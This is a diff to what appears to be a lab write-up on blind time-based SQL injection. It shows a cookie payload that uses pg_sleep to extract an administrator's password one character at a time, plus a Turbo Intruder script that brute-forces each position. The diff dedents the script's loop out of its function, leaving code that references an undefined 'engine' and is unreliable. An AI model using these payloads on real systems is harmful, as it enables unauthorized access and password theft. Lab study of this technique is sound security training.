@@ -17,6 +17,7 @@ Cookie: TrackingId=PHsLpeyuzM3DLeCa'%3b SELECT CASE WHEN ((SELECT LENGTH(passwor
 Cookie: TrackingId=PHsLpeyuzM3DLeCa'%3b SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)>'0')= 1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (check every single character of password)<delayed-OK>
 -> Use turbo intruder to find password
 Note: the valid character will response code status 0 due to delays
+
 ![alt text](lab11.png)
 
 # Turbo Intruder Script:
@@ -28,11 +29,11 @@ def queueRequests(target, wordlists):
         pipeline=False
     )
 
-    passwords = "qwertyuiopasdfghjklzxcvbnm1234567890"
+passwords = "qwertyuiopasdfghjklzxcvbnm1234567890"
 
-    for loop in range(1,21):
-        for pwd in passwords:
-            engine.queue(target.req, [loop, pwd])
+for loop in range(1,21):
+    for pwd in passwords:
+        engine.queue(target.req, [loop, pwd])
 
 def handleResponse(req, interesting):
     table.add(req)
